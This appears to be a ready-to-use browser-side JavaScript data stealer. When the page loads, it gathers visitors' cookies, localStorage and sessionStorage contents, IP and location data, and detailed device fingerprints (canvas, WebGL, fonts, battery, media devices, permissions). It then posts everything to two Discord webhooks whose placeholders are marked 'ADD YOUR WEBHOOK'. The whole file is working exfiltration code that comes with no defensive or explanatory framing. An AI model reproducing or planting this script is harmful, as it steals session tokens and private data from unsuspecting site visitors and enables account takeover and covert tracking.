
const DISCORD_WEBHOOK_URLS = [
 'https://discord.com/api/webhooks/1336754252193730570/-', // ADD YOUR WEBHOOK 
 'https://discord.com/api/webhooks/1336750900907347968/Ki-'// ADD YOUR WEBHOOK 
];

function getWebGLInfo() {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return null;

        return {
            vendor: gl.getParameter(gl.VENDOR),
            renderer: gl.getParameter(gl.RENDERER),
            version: gl.getParameter(gl.VERSION),
            shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
            extensions: gl.getSupportedExtensions(),
            maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
            maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS),
            maxRenderbufferSize: gl.getParameter(gl.MAX_RENDERBUFFER_SIZE)
        };
    } catch (e) {
        return null;
    }
}

function getCanvasFingerprint() {
    try {
        const canvas = document.createElement('canvas');
        canvas.width = 200;
        canvas.height = 200;
        const ctx = canvas.getContext('2d');

        ctx.textBaseline = "top";
        ctx.font = "14px 'Arial'";
        ctx.textBaseline = "alphabetic";
        ctx.fillStyle = "#f60";
        ctx.fillRect(125,1,62,20);
        ctx.fillStyle = "#069";
        ctx.fillText("Fingerprint", 2, 15);
        ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
        ctx.fillText("Test", 4, 45);
        
        return canvas.toDataURL();
    } catch (e) {
        return null;
    }
}

async function getIPInfo() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        return await response.json();
    } catch (error) {
        console.error('Error fetching IP info:', error);
        return null;
    }
}

function getCookies() {
    return document.cookie.split(';').map(cookie => {
        const [name, value] = cookie.trim().split('=');
        return { name: name.trim(), value: value || 'No value' };
    });
}

function getLocalStorageData() {
    const data = [];
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        data.push({
            key: key,
            value: localStorage.getItem(key)
        });
    }
    return data;
}

function getSessionStorageData() {
    const data = [];
    for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        data.push({
            key: key,
            value: sessionStorage.getItem(key)
        });
    }
    return data;
}

async function hasHardwareAcceleration() {
    if (!document.createElement('canvas').getContext) return false;
    try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.rect(0, 0, 10, 10);
        ctx.rect(2, 2, 6, 6);
        return canvas.toDataURL() !== null;
    } catch (e) {
        return false;
    }
}

async function getEnhancedHardwareInfo() {
    return {
        deviceMemory: navigator.deviceMemory,
        hardwareConcurrency: navigator.hardwareConcurrency,
        maxTouchPoints: navigator.maxTouchPoints,
        keyboard: 'keyboard' in navigator,
        hardwareAcceleration: await hasHardwareAcceleration(),
        screenInfo: {
            width: screen.width,
            height: screen.height,
            availWidth: screen.availWidth,
            availHeight: screen.availHeight,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth,
            orientation: screen.orientation ? {
                type: screen.orientation.type,
                angle: screen.orientation.angle
            } : null,
            refreshRate: await getScreenRefreshRate()
        }
    };
}

function getScreenRefreshRate() {
    return new Promise(resolve => {
        requestAnimationFrame(t1 => {
            requestAnimationFrame(t2 => {
                resolve(1000 / (t2 - t1));
            });
        });
    });
}

function getInstalledPlugins() {
    return Array.from(navigator.plugins).map(plugin => ({
        name: plugin.name,
        description: plugin.description
    }));
}

function getInstalledFonts() {
    const testFonts = [
        'Arial', 'Helvetica', 'Times New Roman', 'Times', 'Courier New', 
        'Courier', 'Verdana', 'Georgia', 'Palatino', 'Garamond', 
        'Bookman', 'Comic Sans MS', 'Trebuchet MS', 'Arial Black', 'Impact'
    ];
    
    return testFonts.filter(font => {
        const canvas = document.createElement('canvas');
        const context = canvas.getContext('2d');
        const defaultWidth = context.measureText('abcdefghijklmnopqrstuvwxyz').width;
        
        context.font = '12px "' + font + '", monospace';
        const testWidth = context.measureText('abcdefghijklmnopqrstuvwxyz').width;
        
        return defaultWidth !== testWidth;
    });
}

function getEnhancedNetworkInfo() {
    const connection = navigator.connection || 
                      navigator.mozConnection || 
                      navigator.webkitConnection;
    
    return {
        onLine: navigator.onLine,
        connectionSpeed: connection ? {
            downlink: connection.downlink,
            effectiveType: connection.effectiveType,
            rtt: connection.rtt,
            saveData: connection.saveData
        } : null,
        performance: {
            memory: performance?.memory ? {
                jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
                totalJSHeapSize: performance.memory.totalJSHeapSize,
                usedJSHeapSize: performance.memory.usedJSHeapSize
            } : null,
            timing: performance?.timing ? Object.assign({}, performance.timing) : null
        }
    };
}

function getBatteryInfo() {
    return new Promise((resolve) => {
        if ('getBattery' in navigator) {
            navigator.getBattery().then(battery => {
                resolve({
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime,
                    level: battery.level
                });
            }).catch(() => resolve(null));
        } else {
            resolve(null);
        }
    });
}

function getMediaDevicesInfo() {
    return new Promise((resolve) => {
        if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) {
            resolve(null);
            return;
        }
        
        navigator.mediaDevices.enumerateDevices()
            .then(devices => {
                const deviceInfo = {
                    audioInputDevices: devices.filter(d => d.kind === 'audioinput').length,
                    audioOutputDevices: devices.filter(d => d.kind === 'audiooutput').length,
                    videoInputDevices: devices.filter(d => d.kind === 'videoinput').length
                };
                resolve(deviceInfo);
            })
            .catch(err => {
                console.error('Error getting media devices:', err);
                resolve(null);
            });
    });
}

function getEnhancedBrowserCapabilities() {
    return {
        permissions: checkPermissions(),
        codecs: checkCodecs(),
        features: {
            webGL: (() => {
                try {
                    const canvas = document.createElement('canvas');
                    return !!(canvas.getContext && canvas.getContext('webgl'));
                } catch (e) {
                    return false;
                }
            })(),
            serviceWorker: 'serviceWorker' in navigator,
            localStorage: !!window.localStorage,
            sessionStorage: !!window.sessionStorage,
            indexedDB: !!window.indexedDB,
            geolocation: 'geolocation' in navigator,
            touchSupport: 'ontouchstart' in window,
            webRTC: 'RTCPeerConnection' in window,
            webSocket: 'WebSocket' in window,
            pdfViewer: navigator?.pdfViewerEnabled,
            bluetooth: 'bluetooth' in navigator,
            usb: 'usb' in navigator,
            serial: 'serial' in navigator,
            nfc: 'nfc' in navigator,
            credentials: 'credentials' in navigator,
            share: 'share' in navigator,
            clipboard: 'clipboard' in navigator,
            payment: 'payment' in navigator,
            mediaSession: 'mediaSession' in navigator,
            locks: 'locks' in navigator,
            gpu: 'gpu' in navigator,
            virtualKeyboard: 'virtualKeyboard' in navigator
        }
    };
}

async function checkPermissions() {
    const permissions = {};
    const permissionQueries = [
        'geolocation', 'notifications', 'push', 'midi', 'camera',
        'microphone', 'background-fetch', 'persistent-storage',
        'ambient-light-sensor', 'accelerometer', 'gyroscope', 'magnetometer'
    ];

    for (const permission of permissionQueries) {
        try {
            const result = await navigator.permissions.query({ name: permission });
            permissions[permission] = result.state;
        } catch {
            permissions[permission] = 'unsupported';
        }
    }
    return permissions;
}

function checkCodecs() {
    const videoTypes = [
        'video/mp4; codecs="avc1.42E01E"',
        'video/webm; codecs="vp8"',
        'video/webm; codecs="vp9"',
        'video/hevc; codecs="hevc"'
    ];
    const audioTypes = [
        'audio/mp4; codecs="mp4a.40.2"',
        'audio/mpeg',
        'audio/webm; codecs="vorbis"',
        'audio/webm; codecs="opus"'
    ];

    const codecs = { video: {}, audio: {} };
    const mediaElement = document.createElement('video');
    
    videoTypes.forEach(type => {
        codecs.video[type] = mediaElement.canPlayType(type);
    });
    
    audioTypes.forEach(type => {
        codecs.audio[type] = mediaElement.canPlayType(type);
    });

    return codecs;
}

async function captureComprehensiveInfo() {
    const ipInfo = await getIPInfo();
    const batteryInfo = await getBatteryInfo();
    const mediaDevices = await getMediaDevicesInfo();

    const enhancedData = {
        webGL: getWebGLInfo(),
        canvas: getCanvasFingerprint(),
        hardware: await getEnhancedHardwareInfo(),
        network: getEnhancedNetworkInfo(),
        browser: await getEnhancedBrowserCapabilities(),
        cookies: getCookies(),
        localStorage: getLocalStorageData(),
        sessionStorage: getSessionStorageData(),
        plugins: getInstalledPlugins(),
        fonts: getInstalledFonts(),
        basic: {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            vendor: navigator.vendor,
            language: navigator.language,
            languages: navigator.languages,
            doNotTrack: navigator.doNotTrack,
            cookieEnabled: navigator.cookieEnabled,
            appVersion: navigator.appVersion,
            productSub: navigator.productSub,
            buildID: navigator.buildID,
            product: navigator.product
        },
        additionalInfo: {
            ipInfo,
            batteryInfo,
            mediaDevices
        }
    };

    for (const DISCORD_WEBHOOK_URL of DISCORD_WEBHOOK_URLS) {
        try {
            await fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    embeds: [{
                        title: "Device Fingerprint",
                        description: "Comprehensive Data",
                        color: 0x00FFFF,
                        fields: [
                            {
                                name: "System",
                                value: `Platform: ${enhancedData.basic.platform}\nBrowser: ${enhancedData.basic.userAgent}`,
                                inline: false
                            },
                            {
                                name: "Hardware",
                                value: `Memory: ${enhancedData.hardware.deviceMemory}GB\nCPU Cores: ${enhancedData.hardware.hardwareConcurrency}`,
                                inline: false
                            }
                        ]
                    }]
                })
            });

            const chunks = Object.entries(enhancedData).map(([key, value]) => ({
                name: key,
                content: JSON.stringify(value, null, 2)
            }));

            for (const chunk of chunks) {
                await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `**${chunk.name}**:\n\`\`\`json\n${chunk.content}\n\`\`\``
                    })
                });
                await new Promise(resolve => setTimeout(resolve, 100));
            }

        } catch (error) {
            console.error('Error sending data:', error);
        }
    }
}

window.addEventListener('load', captureComprehensiveInfo);
